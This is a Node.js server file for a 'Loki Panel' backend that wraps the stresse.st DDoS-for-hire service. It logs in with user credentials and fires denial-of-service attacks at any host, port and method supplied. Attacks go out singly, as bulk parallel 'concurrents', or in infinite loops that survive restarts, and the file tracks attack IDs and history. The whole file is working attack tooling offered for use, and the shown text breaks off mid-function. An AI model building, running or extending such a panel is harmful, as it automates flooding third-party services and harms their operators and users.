/**
 * Loki Panel Backend
 * stresse.st proxy + recon/check tools
 */

const express = require('express');
const cors = require('cors');
const axios = require('axios');
const rateLimit = require('express-rate-limit');
const { wrapper } = require('axios-cookiejar-support');
const { CookieJar } = require('tough-cookie');
const net = require('net');
const dns = require('dns');
const fs = require('fs');
const path = require('path');

// Node 20'nin "Happy Eyeballs" (autoSelectFamily) ozelligi, IPv6'si bozuk/eksik
// sunucularda IPv6 denemesi sirasinda "read ECONNRESET" hatasina yol aciyor.
// Bu yuzden IPv4'u tercih edip autoSelectFamily'i kapatiyoruz.
if (typeof net.setDefaultAutoSelectFamily === 'function') {
  net.setDefaultAutoSelectFamily(false);
}
dns.setDefaultResultOrder('ipv4first');

const app = express();
const PORT = process.env.PORT || 3001;

/**
 * CORS whitelist:
 * - Gelistirme ortamlari (localhost, 127.0.0.1 herhangi port)
 * - LOKI_ALLOWED_ORIGINS env degiskeni ile virgulle ayrilmis domainler
 * Ornek: LOKI_ALLOWED_ORIGINS=https://panel.site.com,https://app.site.com
 */
function getAllowedOrigins() {
  const defaults = [
    /^https?:\/\/localhost(:\d+)?$/,
    /^https?:\/\/127\.0\.0\.1(:\d+)?$/
  ];
  const envOrigins = (process.env.LOKI_ALLOWED_ORIGINS || '')
    .split(',')
    .map((o) => o.trim())
    .filter(Boolean);
  return { defaults, envOrigins };
}

function isOriginAllowed(origin) {
  // Bazı proxy/geliştirme durumlarında origin undefined gelebilir; bu durumda izin ver.
  if (!origin || origin === 'undefined' || origin === 'null') return true;
  const { defaults, envOrigins } = getAllowedOrigins();
  if (defaults.some((re) => re.test(origin))) return true;
  if (envOrigins.includes(origin)) return true;
  return false;
}

app.use(cors({
  origin: (origin, callback) => {
    if (isOriginAllowed(origin)) {
      callback(null, origin);
    } else {
      callback(new Error(`CORS policy: origin '${origin}' not allowed`));
    }
  },
  credentials: true,
  exposedHeaders: ['sessionId', 'content-type']
}));
app.use(express.json());

// Rate limiting
const limiter = rateLimit({
  windowMs: 60 * 1000,
  max: 60,
  message: { status: 'error', message: 'Too many requests' }
});
app.use('/api', limiter);

// In-memory session store: { sessionId: { jar: CookieJar, username } }
const sessions = {};

// Active loop registry: { loopId: { running, params, startedAt, lastRoundAt, roundCount, errors, roundAttackIds } }
const activeLoops = {};

// Global loop scheduler: ayni anda sadece 1 loop turu calissin,
// loop'lar arasinda 5 saniye gecikme olsun (ilk biten ilk baslar).
let loopQueue = [];
let isProcessingLoopQueue = false;
let activeLoopRoundCount = 0;
const LOOP_QUEUE_DELAY_MS = 5000;
const MAX_REQUEST_RETRIES = 3;

// Active normal attacks registry: { attackId: { username, host, port, method, time, startedAt, expiresAt } }
const activeAttacks = {};

// Attack history registry: { historyId: { username, target, port, method, time, concurrents, loop, status, startedAt, endedAt } }
const attackHistory = {};

// Persistence: save/restore sessions, loops, attacks and history across restarts
const DATA_DIR = path.join(__dirname, 'data');
const SESSIONS_FILE = path.join(DATA_DIR, 'sessions.json');
const LOOPS_FILE = path.join(DATA_DIR, 'active-loops.json');
const ATTACKS_FILE = path.join(DATA_DIR, 'active-attacks.json');
const HISTORY_FILE = path.join(DATA_DIR, 'attack-history.json');

let saveStateRunning = false;
let saveStatePending = false;

function ensureDataDir() {
  if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
  }
}

function safeWriteJson(filePath, data) {
  try {
    const tmp = `${filePath}.tmp`;
    fs.writeFileSync(tmp, JSON.stringify(data, null, 2));
    fs.renameSync(tmp, filePath);
    // Sadece sahibin okuyabilecegi izinler (deploy ortaminda onemli)
    try {
      fs.chmodSync(filePath, 0o600);
    } catch (chmodErr) {
      // Windows gibi platformlarda chmod desteklenmeyebilir, gormezden gel
    }
  } catch (err) {
    console.error(`[persistence] Failed to write ${filePath}:`, err.message);
  }
}

function saveState() {
  if (saveStateRunning) {
    saveStatePending = true;
    return;
  }
  saveStateRunning = true;

  try {
    ensureDataDir();

    // Save sessions: serialize CookieJar to JSON
    const sessionsToSave = {};
    Object.entries(sessions).forEach(([sessionId, session]) => {
      try {
        sessionsToSave[sessionId] = {
          username: session.username,
          user: session.user,
          plan: session.plan,
          createdAt: session.createdAt,
          jar: session.jar.toJSON()
        };
      } catch (err) {
        console.error(`[persistence] Failed to serialize session ${sessionId}:`, err.message);
      }
    });
    safeWriteJson(SESSIONS_FILE, sessionsToSave);

    // Save loops: only serializable fields
    safeWriteJson(LOOPS_FILE, activeLoops);

    // Save normal attacks
    safeWriteJson(ATTACKS_FILE, activeAttacks);

    // Save attack history
    safeWriteJson(HISTORY_FILE, attackHistory);

    cleanupOldSessions();
  } finally {
    saveStateRunning = false;
    if (saveStatePending) {
      saveStatePending = false;
      setImmediate(saveState);
    }
  }
}

function loadState() {
  ensureDataDir();

  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const raw = fs.readFileSync(SESSIONS_FILE, 'utf8');
      const parsed = JSON.parse(raw);
      Object.entries(parsed).forEach(([sessionId, data]) => {
        try {
          sessions[sessionId] = {
            username: data.username,
            user: data.user,
            plan: data.plan,
            createdAt: data.createdAt || new Date().toISOString(),
            jar: CookieJar.fromJSON(data.jar)
          };
        } catch (err) {
          console.error(`[persistence] Failed to restore session ${sessionId}:`, err.message);
        }
      });
      console.log(`[persistence] Restored ${Object.keys(sessions).length} session(s)`);
    }
  } catch (err) {
    console.error('[persistence] Failed to load sessions:', err.message);
    try {
      fs.renameSync(SESSIONS_FILE, `${SESSIONS_FILE}.corrupt.${Date.now()}`);
    } catch (renameErr) {
      console.error('[persistence] Failed to backup corrupt sessions file:', renameErr.message);
    }
  }

  try {
    if (fs.existsSync(LOOPS_FILE)) {
      const raw = fs.readFileSync(LOOPS_FILE, 'utf8');
      const parsed = JSON.parse(raw);
      Object.entries(parsed).forEach(([loopId, loop]) => {
        // Only restore infinite loops; finite loops with at least one round are considered done
        if (loop.params?.infinite && loop.running !== false) {
          activeLoops[loopId] = { ...loop, running: true, roundAttackIds: [] };
        }
      });
      console.log(`[persistence] Restored ${Object.keys(activeLoops).length} infinite loop(s)`);

      // Geri yuklenen loop'larin motorunu tekrar calistir
      Object.keys(activeLoops).forEach((loopId) => {
        console.log(`[persistence] Restarting loop ${loopId}`);
        runLoop(loopId);
      });
    }
  } catch (err) {
    console.error('[persistence] Failed to load loops:', err.message);
    try {
      fs.renameSync(LOOPS_FILE, `${LOOPS_FILE}.corrupt.${Date.now()}`);
    } catch (renameErr) {
      console.error('[persistence] Failed to backup corrupt loops file:', renameErr.message);
    }
  }

  cleanupOldSessions();

  // Restore normal attacks
  try {
    if (fs.existsSync(ATTACKS_FILE)) {
      const raw = fs.readFileSync(ATTACKS_FILE, 'utf8');
      const parsed = JSON.parse(raw);
      Object.entries(parsed).forEach(([attackId, attack]) => {
        // Sadece gecerli session'a sahip saldirilari geri yukle
        if (attack && sessions[attack.sessionId]) {
          activeAttacks[attackId] = attack;
        }
      });
      console.log(`[persistence] Restored ${Object.keys(activeAttacks).length} attack(s)`);
    }
  } catch (err) {
    console.error('[persistence] Failed to load attacks:', err.message);
    try {
      fs.renameSync(ATTACKS_FILE, `${ATTACKS_FILE}.corrupt.${Date.now()}`);
    } catch (renameErr) {
      console.error('[persistence] Failed to backup corrupt attacks file:', renameErr.message);
    }
  }

  cleanupExpiredAttacks();

  // Restore attack history
  try {
    if (fs.existsSync(HISTORY_FILE)) {
      const raw = fs.readFileSync(HISTORY_FILE, 'utf8');
      const parsed = JSON.parse(raw);
      Object.entries(parsed).forEach(([historyId, record]) => {
        if (record && record.username) {
          attackHistory[historyId] = record;
        }
      });
      console.log(`[persistence] Restored ${Object.keys(attackHistory).length} history record(s)`);
    }
  } catch (err) {
    console.error('[persistence] Failed to load attack history:', err.message);
    try {
      fs.renameSync(HISTORY_FILE, `${HISTORY_FILE}.corrupt.${Date.now()}`);
    } catch (renameErr) {
      console.error('[persistence] Failed to backup corrupt history file:', renameErr.message);
    }
  }

  cleanupOldHistory();
}

// Auto-save every 30 seconds
setInterval(saveState, 30000);

function buildTargetUrl(host, port) {
  if (!host) return '';
  const cleanHost = host.trim().replace(/\/$/, '');
  if (!cleanHost) return '';
  // Zaten URL ise portu URL API ile birlestir
  if (/^https?:\/\//i.test(cleanHost)) {
    try {
      const url = new URL(cleanHost);
      if (port && parseInt(port) > 0) url.port = String(port);
      return url.toString().replace(/\/$/, '');
    } catch {
      return port ? `${cleanHost}:${port}` : cleanHost;
    }
  }
  return port ? `${cleanHost}:${port}` : cleanHost;
}

function registerAttack(attackId, sessionId, params, loopId = null) {
  if (!attackId || !sessionId) return;
  activeAttacks[attackId] = {
    attackId,
    sessionId,
    username: sessions[sessionId]?.username,
    host: params.host,
    port: params.port,
    method: params.method,
    time: parseInt(params.time) || 0,
    loopId: loopId || null,
    startedAt: new Date().toISOString(),
    expiresAt: new Date(Date.now() + (parseInt(params.time) || 0) * 1000).toISOString()
  };
  saveState();
}

function unregisterAttack(attackId) {
  if (!attackId) return;
  delete activeAttacks[attackId];
  saveState();
}

function cleanupExpiredAttacks() {
  const now = Date.now();
  let removed = 0;
  const completedHistories = new Set();

  Object.entries(activeAttacks).forEach(([attackId, attack]) => {
    const expires = new Date(attack.expiresAt || 0).getTime();
    // 60 saniye tolerans: stresse.st bazen biraz gecikmeli sonlandirabilir
    if (now - expires > 60 * 1000) {
      const loopId = attack.loopId;
      delete activeAttacks[attackId];
      removed++;

      if (loopId) {
        // Eger bu saldiri bir loop'a aitse ve loop artik aktif degilse,
        // o loop'a ait baska aktif saldiri kalmadiginda loop history'sini tamamlandi olarak isaretle.
        if (!activeLoops[loopId]) {
          const stillActive = Object.values(activeAttacks).some(
            (a) => a.loopId === loopId
          );
          if (!stillActive) {
            const historyId = `hist_loop_${loopId}`;
            if (attackHistory[historyId] && attackHistory[historyId].status === 'active') {
              completedHistories.add(historyId);
            }
          }
        }
      } else {
        // Normal (loopsuz) saldiri: history'yi tamamlandi olarak isaretle
        const history = findActiveHistoryByAttackId(attackId);
        if (history && history.status === 'active') {
          completedHistories.add(history.historyId);
        }
      }
    }
  });

  completedHistories.forEach((historyId) => {
    updateAttackHistoryStatus(historyId, 'completed');
    console.log(`[cleanup] History completed: ${historyId}`);
  });

  if (removed > 0) {
    console.log(`[cleanup] Removed ${removed} expired attack(s)`);
  }
}

// Expired attacks cleanup every 60 seconds
setInterval(cleanupExpiredAttacks, 60000);

function addAttackHistory(sessionId, params, options = {}) {
  if (!sessionId) return;
  const username = sessions[sessionId]?.username;
  if (!username) return;

  const historyId = options.historyId || `hist_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
  const now = new Date();
  attackHistory[historyId] = {
    historyId,
    username,
    target: params.host,
    port: params.port || null,
    method: params.method,
    time: parseInt(params.time) || 0,
    concurrents: parseInt(options.concurrents) || parseInt(params.concurrents) || 1,
    loop: !!options.loop,
    status: 'active',
    startedAt: now.toISOString(),
    expiresAt: new Date(now.getTime() + (parseInt(params.time) || 0) * 1000).toISOString(),
    endedAt: null,
    attackIds: options.attackIds || []
  };
  saveState();
  return historyId;
}

function updateAttackHistoryStatus(historyId, status) {
  if (!historyId || !attackHistory[historyId]) return;
  attackHistory[historyId].status = status;
  attackHistory[historyId].endedAt = new Date().toISOString();
  saveState();
}

function findActiveHistoryByAttackId(attackId) {
  return Object.values(attackHistory).find(
    (h) => h.status === 'active' && h.attackIds.includes(attackId)
  );
}

const HISTORY_MAX_AGE_MS = 7 * 24 * 60 * 60 * 1000; // 7 gun

function cleanupOldHistory() {
  const now = Date.now();
  let removed = 0;
  Object.entries(attackHistory).forEach(([historyId, record]) => {
    const started = new Date(record.startedAt || 0).getTime();
    if (now - started > HISTORY_MAX_AGE_MS) {
      delete attackHistory[historyId];
      removed++;
    }
  });
  if (removed > 0) {
    console.log(`[cleanup] Removed ${removed} old history record(s)`);
  }
}

// Old history cleanup every hour
setInterval(cleanupOldHistory, 60 * 60 * 1000);

function getSessionPlan(sessionId) {
  return sessions[sessionId]?.plan || {};
}

function handleEndpointError(res, error, label) {
  if (error.statusCode) {
    return res.status(error.statusCode).json({ status: 'error', message: error.message });
  }
  if (error.response) {
    return res.status(error.response.status).json({
      status: 'error',
      message: error.response.data?.message || error.message,
      data: error.response.data
    });
  }
  console.error(`${label}:`, error.message);
  res.status(500).json({ status: 'error', message: error.message });
}

function checkPlanLimits(sessionId, time, concurrents) {
  const plan = getSessionPlan(sessionId);
  const maxTime = plan.MaxTime || plan.attackTime || 86400;
  const maxConcurrents = plan.Concurrents || plan.concurrents || 80;

  if (parseInt(time) > parseInt(maxTime)) {
    return { ok: false, message: `Maksimum sure ${maxTime} saniye olabilir` };
  }
  if (parseInt(concurrents) > parseInt(maxConcurrents)) {
    return { ok: false, message: `Maksimum concurrent ${maxConcurrents} olabilir` };
  }
  return { ok: true };
}

const SESSION_MAX_AGE_MS = 24 * 60 * 60 * 1000; // 24 saat

function cleanupOldSessions() {
  const now = Date.now();
  let removed = 0;
  Object.entries(sessions).forEach(([sessionId, session]) => {
    const created = new Date(session.createdAt || 0).getTime();
    if (now - created > SESSION_MAX_AGE_MS) {
      delete sessions[sessionId];
      removed++;
    }
  });
  if (removed > 0) {
    console.log(`[cleanup] Removed ${removed} expired session(s)`);
  }
}

/**
 * L4 host degerini normalize eder:
 * - URL protokolunu kaldirir (https://, http://)
 * - Icindeki port bilgisini kaldirir (host:443 -> host)
 * - Sonu / ile bitiyorsa kaldirir
 * Boylece disaridan verilen port ile cakisma olmaz.
 */
function normalizeHost(host) {
  if (!host || typeof host !== 'string') return host;
  let h = host.trim();
  h = h.replace(/^https?:\/\//i, '');
  h = h.split('/')[0];
  h = h.replace(/:\d+$/, '');
  return h;
}

/**
 * Method bazli minimum atak suresi (saniye).
 * HTTP-TEMPESTA 200 sn; diger L7 methodlar 60 sn; L4 methodlar 60 sn.
 */
const METHOD_MIN_TIME = {
  'HTTP-TEMPESTA': 200
};
const L7_MIN_TIME = 60;
const L4_MIN_TIME = 60;

function getMinTime(method, layer) {
  if (METHOD_MIN_TIME[method?.toUpperCase()]) return METHOD_MIN_TIME[method.toUpperCase()];
  if (layer === 'L7') return L7_MIN_TIME;
  return L4_MIN_TIME;
}

function isFreeMethod(method) {
  return typeof method === 'string' && method.toUpperCase().startsWith('FREE-');
}

/**
 * L7 hedef URL'yi normalize eder:
 * - Protokol yoksa https:// ekler
 * - Sonunda / yoksa ekler
 * - Varolan protokol ve path korunur
 */
function normalizeUrl(url) {
  if (!url || typeof url !== 'string') return url;
  let u = url.trim();
  if (!/^https?:\/\//i.test(u)) {
    u = 'https://' + u;
  }
  // Fazladan /path kisimlarini koruyoruz ama en azindan trailing slash olsun
  if (!u.endsWith('/')) {
    u += '/';
  }
  return u;
}

function getJar(sessionId) {
  if (!sessions[sessionId]) {
    return null;
  }
  return sessions[sessionId].jar;
}

function getClient(sessionId) {
  const jar = getJar(sessionId);
  if (!jar) {
    const err = new Error('Invalid or expired session');
    err.statusCode = 401;
    throw err;
  }
  return wrapper(axios.create({
    baseURL: 'https://stresse.st',
    jar,
    withCredentials: true,
    family: 4,
    maxRedirects: 5,
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Accept': 'application/json, text/plain, */*',
      'Accept-Language': 'en-US,en;q=0.9',
      'Origin': 'https://stresse.st',
      'Referer': 'https://stresse.st/hub'
    },
    timeout: 45000
  }));
}

// =====================
// stresse.st PROXY
// =====================

/**
 * POST /api/stresse/login
 * Body: { username, password }
 */
app.post('/api/stresse/login', async (req, res) => {
  try {
    const { username, password } = req.body;
    if (!username || !password) {
      return res.status(400).json({ status: 'error', message: 'Username and password required' });
    }

      const sessionId = `sess_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
      sessions[sessionId] = { jar: new CookieJar(), username: null, createdAt: new Date().toISOString() };
      const client = getClient(sessionId);

      let step = 'GET /login';
    try {
      // 1. Get login page to collect cookies (retry ile)
      let loginPageOk = false;
      for (let attempt = 1; attempt <= 3; attempt++) {
        try {
          await client.get('/login');
          loginPageOk = true;
          break;
        } catch (retryErr) {
          console.warn(`[login] GET /login deneme ${attempt}/3 hata: ${retryErr.message}`);
          if (attempt === 3) throw retryErr;
          await new Promise((r) => setTimeout(r, 1000));
        }
      }
      if (!loginPageOk) throw new Error('Login sayfasi alinamadi');

      // 2. Submit login credentials (retry ile)
      step = 'POST /login';
      let loginRes;
      for (let attempt = 1; attempt <= 3; attempt++) {
        try {
          loginRes = await client.post('/login', { username, password });
          break;
        } catch (retryErr) {
          console.warn(`[login] POST /login deneme ${attempt}/3 hata: ${retryErr.message}`);
          if (attempt === 3) throw retryErr;
          await new Promise((r) => setTimeout(r, 1000));
        }
      }

      // 3. Verify session (retry ile)
      step = 'GET /vcookie';
      let vcookieRes;
      for (let attempt = 1; attempt <= 3; attempt++) {
        try {
          vcookieRes = await client.get('/vcookie');
          break;
        } catch (retryErr) {
          console.warn(`[login] GET /vcookie deneme ${attempt}/3 hata: ${retryErr.message}`);
          if (attempt === 3) throw retryErr;
          await new Promise((r) => setTimeout(r, 1000));
        }
      }
      if (!vcookieRes.data || !vcookieRes.data.username) {
        return res.status(401).json({ status: 'error', message: 'Invalid credentials' });
      }

      // 4. Fetch user plan for backend-side limit enforcement
      step = 'GET /plan';
      let planData = {};
      try {
        const planRes = await client.get(`/plan/${vcookieRes.data.username}`);
        planData = planRes.data || {};
      } catch (planErr) {
        console.warn(`[login] Plan alinamadi: ${planErr.message}`);
      }

      sessions[sessionId].username = vcookieRes.data.username || username;
      sessions[sessionId].user = vcookieRes.data;
      sessions[sessionId].plan = planData;
      saveState();

      res.json({
        status: 'success',
        sessionId,
        user: vcookieRes.data,
        plan: planData
      });
    } catch (stepErr) {
      // Basarisiz login durumunda olusturulan gecici session'i temizle
      delete sessions[sessionId];
      saveState();

      // Hangi adimda patladigini ve stresse.st'in dondugu govdeyi acikca gorelim
      const status = stepErr.response?.status;
      const body = stepErr.response?.data;
      console.error(`Login error @ ${step}: ${stepErr.message}`);
      console.error(`  upstream status: ${status}`);
      console.error(`  upstream body:`, typeof body === 'string' ? body.slice(0, 500) : JSON.stringify(body)?.slice(0, 500));
      return res.status(502).json({
        status: 'error',
        message: `stresse.st ${step} -> ${status || 'no-response'}: ${stepErr.message}`,
        upstreamStatus: status,
        upstreamBody: typeof body === 'string' ? body.slice(0, 300) : body
      });
    }
  } catch (error) {
    console.error('Login error:', error.message);
    res.status(500).json({ status: 'error', message: error.message });
  }
});

/**
 * GET /api/stresse/user/:username
 */
app.get('/api/stresse/user/:username', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const client = getClient(sessionId);
    const response = await client.get(`/user/${req.params.username}`);
    res.json(response.data);
  } catch (error) {
    handleEndpointError(res, error, 'User fetch error');
  }
});

/**
 * GET /api/stresse/plan/:username
 */
app.get('/api/stresse/plan/:username', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const client = getClient(sessionId);
    const response = await client.get(`/plan/${req.params.username}`);
    res.json(response.data);
  } catch (error) {
    handleEndpointError(res, error, 'Plan fetch error');
  }
});

/**
 * GET /api/stresse/methods
 */
app.get('/api/stresse/methods', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const client = getClient(sessionId);
    const response = await client.get('/methods.json');
    res.json(response.data);
  } catch (error) {
    handleEndpointError(res, error, 'Methods fetch error');
  }
});

/**
 * GET /api/stresse/ongoing/:username
 *
 * stresse.st'ten gelen gercek ongoing listesine, backend restart sonrasi
 * hatirladigimiz attack ID'lerini de ekler. Boylece normal saldirilar da
 * restart sonrasi panelde gorunmeye devam eder.
 */
app.get('/api/stresse/ongoing/:username', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const { username } = req.params;
    const client = getClient(sessionId);
    const response = await client.get(`/ongoing/${username}`);

    let ongoing = [];
    if (Array.isArray(response.data)) {
      ongoing = response.data;
    } else if (response.data && Array.isArray(response.data.attacks)) {
      ongoing = response.data.attacks;
    }

    const existingIds = new Set(ongoing.map((a) => a.attack_id || a.id));
    const now = Date.now();

    Object.values(activeAttacks).forEach((attack) => {
      // Sadece ayni session'a ait saldirilari ekle (diger kullanicilarin saldirilarini karistirma)
      if (attack.sessionId !== sessionId) return;
      // Sadece ayni kullaniciya ait saldirilari ekle
      if (attack.username && attack.username !== username) return;
      // Zaten listede varsa tekrar ekleme
      if (existingIds.has(attack.attackId)) return;

      const expires = new Date(attack.expiresAt || 0).getTime();
      const timeLeft = Math.max(0, Math.round((expires - now) / 1000));
      if (timeLeft <= 0) return; // Suresi dolmussa ekleme

      ongoing.push({
        attack_id: attack.attackId,
        id: attack.attackId,
        target: buildTargetUrl(attack.host, attack.port),
        host: attack.host,
        port: attack.port,
        method: attack.method,
        timeLeft,
        // Frontend'in diger alanlarini doldur
        time: attack.time,
        startedAt: attack.startedAt,
        expiresAt: attack.expiresAt,
        // stresse.st'den gelen gercek deger degil, "persisted" isareti
        persisted: true
      });
    });

    res.json(ongoing);
  } catch (error) {
    handleEndpointError(res, error, 'Ongoing fetch error');
  }
});

/**
 * POST /api/stresse/attack
 */
app.post('/api/stresse/attack', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const { port, time, method, subnet = '32', geo = 'worldwide', layer = 'L4' } = req.body;
    const rawHost = req.body.host;
    const host = layer === 'L7' ? normalizeUrl(rawHost) : normalizeHost(rawHost);
    if (!host || !port || !time || !method) {
      return res.status(400).json({ status: 'error', message: 'host, port, time and method required' });
    }

    if (isFreeMethod(method)) {
      return res.status(403).json({ status: 'error', message: 'FREE methodlar bu panelde kullanilamaz' });
    }

    const minTime = getMinTime(method, layer);
    if (parseInt(time) < minTime) {
      return res.status(400).json({ status: 'error', message: `Minimum sure ${minTime} saniye (${method})` });
    }

    const planCheck = checkPlanLimits(sessionId, time, 1);
    if (!planCheck.ok) {
      return res.status(403).json({ status: 'error', message: planCheck.message });
    }

    const client = getClient(sessionId);

    // Fetch CSRF token first
    const csrfRes = await client.get('/csrf-token');
    const csrfToken = csrfRes.data.csrfToken;

    const response = await client.post('/attack', {
      host,
      port: parseInt(port),
      time: time.toString(),
      method,
      subnet,
      geo
    }, {
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken
      }
    });

    // stresse.st bazen 200 OK ile { status: 'error', message: '...' } dondurebilir
    if (response.data && response.data.status === 'error') {
      return res.status(400).json({
        status: 'error',
        message: response.data.message || 'Saldiri baslatilamadi',
        data: response.data
      });
    }

    // Basarili tek saldiriyi kaydet ki restart sonrasi gorulebilsin
    const attackId = response.data?.id || response.data?.attack_id;
    if (attackId) {
      registerAttack(attackId, sessionId, { host, port, method, time });
      addAttackHistory(sessionId, { host, port, method, time }, {
        concurrents: 1,
        attackIds: [attackId]
      });
    }

    res.json(response.data);
  } catch (error) {
    handleEndpointError(res, error, 'Attack error');
  }
});

/**
 * POST /api/stresse/attack/bulk
 * Body: { host, port, time, method, subnet, geo, concurrents }
 *
 * Ayni hedefe concurrents kadar paralel saldiri baslatir.
 */
app.post('/api/stresse/attack/bulk', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const { port, time, method, subnet = '32', geo = 'worldwide', layer = 'L4', concurrents = 1 } = req.body;
    const rawHost = req.body.host;
    const host = layer === 'L7' ? normalizeUrl(rawHost) : normalizeHost(rawHost);
    if (!host || !port || !time || !method) {
      return res.status(400).json({ status: 'error', message: 'host, port, time and method required' });
    }

    if (isFreeMethod(method)) {
      return res.status(403).json({ status: 'error', message: 'FREE methodlar bu panelde kullanilamaz' });
    }

    const minTime = getMinTime(method, layer);
    if (parseInt(time) < minTime) {
      return res.status(400).json({ status: 'error', message: `Minimum sure ${minTime} saniye (${method})` });
    }

    const count = Math.max(1, parseInt(concurrents) || 1);

    const planCheck = checkPlanLimits(sessionId, time, count);
    if (!planCheck.ok) {
      return res.status(403).json({ status: 'error', message: planCheck.message });
    }

    const client = getClient(sessionId);

    // Tek CSRF token ile tum istekleri gonder
    const csrfRes = await client.get('/csrf-token');
    const csrfToken = csrfRes.data.csrfToken;

    const attackPayload = {
      host,
      port: parseInt(port),
      time: time.toString(),
      method,
      subnet,
      geo
    };
    const attackHeaders = {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken
    };

    const results = await Promise.all(
      Array.from({ length: count }, () =>
        client.post('/attack', attackPayload, { headers: attackHeaders })
          .then((r) => ({ status: 'success', data: r.data }))
          .catch((err) => ({ status: 'error', message: err.message, data: err.response?.data }))
      )
    );

    const successResults = results.filter((r) => r.status === 'success' && !(r.data?.status === 'error'));
    const failResults = results.filter((r) => r.status === 'error' || r.data?.status === 'error');

    console.log(`[attack/bulk] ${host}:${port} ${method} x${count} -> ${successResults.length} success, ${failResults.length} fail`);

    // Basarili bulk saldirilarin ID'lerini kaydet
    const bulkAttackIds = [];
    successResults.forEach((r) => {
      const attackId = r.data?.id || r.data?.attack_id;
      if (attackId) {
        registerAttack(attackId, sessionId, { host, port, method, time });
        bulkAttackIds.push(attackId);
      }
    });

    if (bulkAttackIds.length > 0) {
      addAttackHistory(sessionId, { host, port, method, time }, {
        concurrents: count,
        attackIds: bulkAttackIds
      });
    }

    res.json({
      status: 'success',
      total: count,
      successCount: successResults.length,
      failCount: failResults.length,
      results,
      // Tek saldiriyla uyumlu donus icin ilk basarili ID
      id: successResults[0]?.data?.id || successResults[0]?.data?.attack_id || null,
      attack_id: successResults[0]?.data?.id || successResults[0]?.data?.attack_id || null
    });
  } catch (error) {
    handleEndpointError(res, error, 'Bulk attack error');
  }
});

/**
 * Verilen loopId icin loop motorunu calistirir.
 * startLoop ve loadState() tarafindan kullanilir.
 */
const MAX_LOOP_CONSECUTIVE_ERRORS = 10;

async function fetchCsrfToken(client, loopId) {
  try {
    const csrfRes = await client.get('/csrf-token');
    return csrfRes.data.csrfToken || null;
  } catch (err) {
    console.error(`[loop ${loopId}] CSRF token alinamadi:`, err.message);
    return null;
  }
}

async function runLoop(loopId) {
  const loop = activeLoops[loopId];
  if (!loop || !loop.sessionId) {
    console.error(`[loop ${loopId}] Baslatilamadi: loop veya sessionId bulunamadi`);
    delete activeLoops[loopId];
    saveState();
    return;
  }

  // Loop'u global kuyruga ekle; scheduler sirasi geldiginde calistiracak.
  if (!loopQueue.includes(loopId)) {
    loopQueue.push(loopId);
    console.log(`[loop ${loopId}] kuyruga eklendi. Sira: ${loopQueue.length}`);
  }
  processLoopQueue();
}

async function processLoopQueue() {
  if (isProcessingLoopQueue) return;
  isProcessingLoopQueue = true;

  while (loopQueue.length > 0) {
    // Ayni anda sadece 1 loop turu calissin; aktif tur varsa bekle
    if (activeLoopRoundCount > 0) {
      await new Promise(r => setTimeout(r, 500));
      continue;
    }

    const loopId = loopQueue.shift();
    const loop = activeLoops[loopId];
    if (!loop || !loop.running) continue;

    // Kuyrukta baska loop varsa (bu son degilse), loop'lar arasi 5 saniye bekle.
    // Tek loop varsa bekleme olmaz.
    if (loopQueue.length > 0) {
      console.log(`[scheduler] ${loopId} icin ${LOOP_QUEUE_DELAY_MS}ms bekleniyor (kuyrukta ${loopQueue.length} loop daha var)`);
      await new Promise(r => setTimeout(r, LOOP_QUEUE_DELAY_MS));
    }

    activeLoopRoundCount++;
    console.log(`[scheduler] ${loopId} turu baslatiliyor`);
    runLoopRound(loopId).finally(() => {
      activeLoopRoundCount--;
      // Tur bittikten sonra loop hala calisiyorsa kuyrugun sonuna ekle
      if (activeLoops[loopId]?.running) {
        if (!loopQueue.includes(loopId)) {
          loopQueue.push(loopId);
          console.log(`[loop ${loopId}] tur tamamlandi, kuyruga geri eklendi`);
        }
      } else {
        cleanupLoop(loopId);
      }
      // Scheduler'i tekrar calistir
      processLoopQueue();
    });
  }

  isProcessingLoopQueue = false;
}

async function runLoopRound(loopId) {
  const loop = activeLoops[loopId];
  if (!loop || !loop.running) return;

  const client = getClient(loop.sessionId);
  let csrfToken = await fetchCsrfToken(client, loopId);
  if (!csrfToken) {
    loop.errors += 1;
    console.error(`[loop ${loopId}] CSRF token alinamadi, tur atlandi`);
    saveState();
    return;
  }

  loop.roundCount += 1;
  loop.lastRoundAt = new Date().toISOString();
  const round = loop.roundCount;

  // Her 5 turda bir CSRF token'i tazeleyelim
  if (round % 5 === 0) {
    const freshToken = await fetchCsrfToken(client, loopId);
    if (freshToken) csrfToken = freshToken;
  }

  const attackPayload = {
    host: loop.params.layer === 'L7' ? normalizeUrl(loop.params.host) : normalizeHost(loop.params.host),
    port: loop.params.port,
    time: loop.params.time.toString(),
    method: loop.params.method,
    subnet: loop.params.subnet,
    geo: loop.params.geo
  };
  const attackHeaders = {
    'Content-Type': 'application/json',
    'X-CSRF-Token': csrfToken
  };

  // Her yeni turda once onceki tur ID'lerini temizle
  loop.roundAttackIds = [];

  // Concurrent'lari ayni anda gonder; basarisiz olanlari retry et
  let roundSuccesses = 0;
  const roundAttacks = [];
  for (let c = 0; c < loop.params.concurrents; c++) {
    roundAttacks.push(
      (async () => {
        for (let attempt = 0; attempt <= MAX_REQUEST_RETRIES; attempt++) {
          try {
